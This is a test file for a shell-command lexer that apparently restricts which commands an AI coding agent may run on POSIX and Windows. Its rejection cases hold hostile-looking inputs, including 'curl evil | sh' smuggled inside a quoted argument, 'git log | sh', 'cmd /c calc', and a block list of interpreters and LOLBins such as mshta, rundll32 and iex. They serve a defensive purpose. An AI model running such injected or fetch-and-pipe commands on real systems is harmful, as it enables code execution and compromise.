import { describe, expect, it } from "vitest"

import { lex, lexWindows } from "./lexer.js"

const argv = (command: string): readonly string[] | undefined => {
  const lexed = lex(command)
  return lexed.ok ? lexed.argv : undefined
}

describe("the lexer", () => {
  it("splits plain words and joins adjacent quoted parts into one word", () => {
    expect(argv("git push -u origin fix:fix")).toEqual(["git", "push", "-u", "origin", "fix:fix"])
    expect(argv(`gh pr create --title 'a b'"c d"e --draft`)).toEqual([
      "gh",
      "pr",
      "create",
      "--title",
      "a bc de",
      "--draft",
    ])
    expect(argv("echo ''")).toEqual(["echo", ""])
  })

  it("keeps single-quoted text literal, newlines and shell characters included", () => {
    expect(argv("gh pr comment 4 --body 'a $X `b` !\nline two'")).toEqual([
      "gh",
      "pr",
      "comment",
      "4",
      "--body",
      "a $X `b` !\nline two",
    ])
  })

  it("keeps newlines in double quotes after --body or -b, and nowhere else", () => {
    expect(argv('gh pr comment 4 -b "don\'t\nstop"')).toEqual([
      "gh",
      "pr",
      "comment",
      "4",
      "-b",
      "don't\nstop",
    ])
    expect(lex('gh pr comment 4 --title "a\nb"').ok).toBe(false)
    expect(lex("echo 'a\nb'").ok).toBe(false)
  })

  it.each([
    ["a parameter expansion", "git push origin ${X:-main}:fix"],
    ["a plain variable", "git push origin $BRANCH:fix"],
    ["brace expansion", "git push origin {a,main}:fix"],
    ["ANSI-C quoting", "git push origin $'main':fix"],
    ["=cmd expansion", "git push =sh"],
    ["a command substitution", "gh pr comment 1 --body \"$(cat <<'EOF'\nhi\nEOF\n)\""],
    ["a backtick", "echo `id`"],
    ["a chained cd", "cd x && git push origin a:b"],
    ["a semicolon", "git status; curl x"],
    ["a pipe", "git log | sh"],
    ["a background job", "git status &"],
    ["a redirect", "git log > out"],
    ["a subshell", "(git status)"],
    ["a glob", "ls *.ts"],
    ["a tilde", "ls ~/x"],
    ["a comment", "git status #x"],
    ["an unquoted newline", "git status\ncurl x"],
    ["a backslash", "git status\\ x"],
    ["an assignment prefix", "FOO=1 git push origin a:b"],
    ["an unterminated quote", "git 'status"],
    ["a $ in double quotes", 'echo "$HOME"'],
    ["a backtick in double quotes", 'echo "`id`"'],
    ["a backslash in double quotes", 'echo "a\\b"'],
    ["a ! in double quotes", 'echo "hi!"'],
    ["a tab in single quotes", "echo 'a\tb'"],
    ["a non-ASCII word", "echo 'café'"],
    ["a control character", "echo 'a\u0007'"],
    ["an empty command", "   "],
    [
      "a backslash in single quotes (fish escapes \\')",
      "gh pr comment 5 -R o/n --body 'a\\'x' ; curl evil | sh ; \\'",
    ],
    ["ENV in capitals", "ENV git status"],
    ["SUDO in capitals", "SUDO git status"],
    ["Bash -c", "Bash -c 'git status'"],
    ["bash.exe -c", "C:/x/bash.exe -c 'git status'"],
    ["env", "env FOO=1 git status"],
    ["/usr/bin/env", "/usr/bin/env git status"],
    ["sudo", "sudo git status"],
    ["command", "command git status"],
    ["exec", "exec git status"],
    ["xargs", "xargs git status"],
    ["cd", "cd x"],
    ["sh -c", "sh -c 'git status'"],
    ["bash -c", "bash -c 'git status'"],
    ["bash -lc", "bash -lc 'git status'"],
  ])("refuses %s", (_name, command) => {
    expect(lex(command).ok).toBe(false)
  })

  it("allows a word to hold = after its first character", () => {
    expect(argv("gh pr edit 1 --title=x")).toEqual(["gh", "pr", "edit", "1", "--title=x"])
    expect(argv("git status =x")).toBeUndefined()
  })

  it("gives a reason", () => {
    expect(lex("a; b")).toMatchObject({ ok: false, reason: expect.stringContaining(";") })
  })
})

describe("the POSIX lexer's programs that run other code, for Git Bash on Windows", () => {
  it.each(["cmd /c calc", "powershell x", "wsl ls", "start x", "mshta x", "C:/Windows/cmd.exe x"])(
    "refuses a leading %s",
    (command) => {
      expect(lex(command).ok).toBe(false)
    },
  )
})

const windows = (command: string): readonly string[] | undefined => {
  const lexed = lexWindows(command)
  return lexed.ok ? lexed.argv : undefined
}

describe("the Windows Codex lexer", () => {
  it("splits quote-free words by spaces, as PowerShell and cmd both do", () => {
    expect(windows("gh pr create --fill --head x -R o/n")).toEqual([
      "gh",
      "pr",
      "create",
      "--fill",
      "--head",
      "x",
      "-R",
      "o/n",
    ])
    expect(windows("  gh   pr  view  ")).toEqual(["gh", "pr", "view"])
    expect(windows("git push https://github.com/o/n.git a:b")).toEqual([
      "git",
      "push",
      "https://github.com/o/n.git",
      "a:b",
    ])
  })

  it("takes every character class of an argv both shells read alike", () => {
    expect(windows("prog Az09._/:=@+-\\x --a=b -c a@b C:\\dir\\f.txt")).toEqual([
      "prog",
      "Az09._/:=@+-\\x",
      "--a=b",
      "-c",
      "a@b",
      "C:\\dir\\f.txt",
    ])
  })

  it.each([
    ["a percent sign, which cmd expands", "echo %PATH%"],
    ["a dollar sign", "echo $env:X"],
    ["a tilde", "cat ~/x"],
    ["a comma, which makes arrays", "prog a,b"],
    ["a backtick", "echo a`b"],
    ["a single quote, which cmd does not take", "echo 'a b'"],
    ["a double quote that opens inside a word", 'echo a"b c"'],
    ["a double quote that closes before the word ends", 'echo "a"b'],
    ["a double quote in the middle of a quoted word", 'echo "a"b"'],
    ["an unterminated double quote", 'echo "a b'],
    ["an empty double quote", 'echo ""'],
    ["a quoted program", '"gh" pr view'],
    ["a quoted word ending in a backslash", 'echo "C:\\Users\\Jan Kowalski\\"'],
    ["a percent sign inside quotes", 'echo "100%"'],
    ["a variable inside quotes", 'echo "$env:X a"'],
    ["a backtick inside quotes", 'echo "a`b c"'],
    ["an exclamation mark inside quotes", 'echo "hi there!"'],
    ["a caret inside quotes", 'echo "a ^ b"'],
    ["an ampersand inside quotes", 'echo "a & b"'],
    ["a pipe inside quotes", 'echo "a | b"'],
    ["a redirect inside quotes", 'echo "a > b"'],
    ["a round bracket inside quotes", 'echo "f (x)"'],
    ["a square bracket inside quotes", 'echo "a [0]"'],
    ["a brace inside quotes", 'echo "{a b}"'],
    ["a semicolon inside quotes", 'echo "a; b"'],
    ["a hash inside quotes", 'echo "a #b"'],
    ["a tilde inside quotes", 'echo "~ a"'],
    ["a star inside quotes", 'echo "*.txt a"'],
    ["a question mark inside quotes", 'echo "why a?"'],
    ["a tab inside quotes", 'echo "a\tb"'],
    ["a newline inside quotes", 'echo "a\nb"'],
    ["a quoted word starting with @", 'echo "@args a"'],
    ["a quoted word starting with --%", 'echo "--% a"'],
    ["a single-quoted word with a space", "echo 'a b'"],
    ["a hash", "echo a#b"],
    ["a round bracket", "echo (a)"],
    ["a square bracket", "echo a[0]"],
    ["a brace", "echo {a}"],
    ["a semicolon", "a; b"],
    ["an ampersand", "a && b"],
    ["a pipe", "a | b"],
    ["an output redirect", "a > f"],
    ["an input redirect", "a < f"],
    ["the stop-parsing token", "prog --% x"],
    ["a splat", "prog @args"],
    ["a splat after a space only at a word start", "prog a @b"],
    ["a newline", "a\nb"],
    ["a carriage return", "a\r\nb"],
    ["a tab", "a\tb"],
    ["a caret", "a ^ b"],
    ["an exclamation mark", "a !b"],
    ["a star", "ls *.txt"],
    ["a question mark", "ls a?"],
    ["a non-ASCII letter", "echo é"],
    ["an empty command", ""],
    ["only spaces", "   "],
    ["a variable assignment", "FOO=1 gh pr ready 1"],
    ["a leading env", "env FOO=1 gh pr ready 1"],
    ["a leading path of a wrapper", "C:\\tools\\sudo.exe gh"],
    ...[
      "wsl",
      "start",
      "saps",
      "call",
      "iex",
      "invoke-expression",
      "ii",
      "invoke-item",
      "cscript",
      "wscript",
      "mshta",
      "rundll32",
      "regsvr32",
      "powershell",
      "pwsh",
      "cmd",
      "conhost",
    ].map((program) => [`a leading ${program}`, `${program} x`]),
    ["a leading CMD.EXE in capitals", "C:\\Windows\\System32\\CMD.EXE /c calc"],
    ["a leading start.cmd", "start.cmd x"],
    ["a leading powershell.ps1", "powershell.ps1 x"],
  ])("refuses %s", (_name, command) => {
    expect(windows(command)).toBeUndefined()
  })
})

describe("the Windows lexer's whole-word double quotes", () => {
  it.each([
    ['echo "C:\\Users\\Jan Kowalski\\note.md"', ["echo", "C:\\Users\\Jan Kowalski\\note.md"]],
    ['gh pr create --title "Fix the bug"', ["gh", "pr", "create", "--title", "Fix the bug"]],
    ['prog "it\'s, fine"', ["prog", "it's, fine"]],
    ['prog "plain"', ["prog", "plain"]],
    ['prog "a b" c "d e"', ["prog", "a b", "c", "d e"]],
    ['prog   "a b"   ', ["prog", "a b"]],
    ['prog "C:\\dir\\a b\\x" "--k=v w"', ["prog", "C:\\dir\\a b\\x", "--k=v w"]],
    ['prog "a\\b c"', ["prog", "a\\b c"]],
  ])("reads %s as its content", (command, expected) => {
    expect(windows(command)).toEqual(expected)
  })

  it("leaves the POSIX lexer unchanged", () => {
    expect(lex("echo 'a b' \"c d\"")).toEqual({ ok: true, argv: ["echo", "a b", "c d"] })
    expect(lex('echo "a\\b"').ok).toBe(false)
    expect(lex("echo 100%")).toEqual({ ok: true, argv: ["echo", "100%"] })
    expect(lex('echo "a$b"').ok).toBe(false)
  })
})
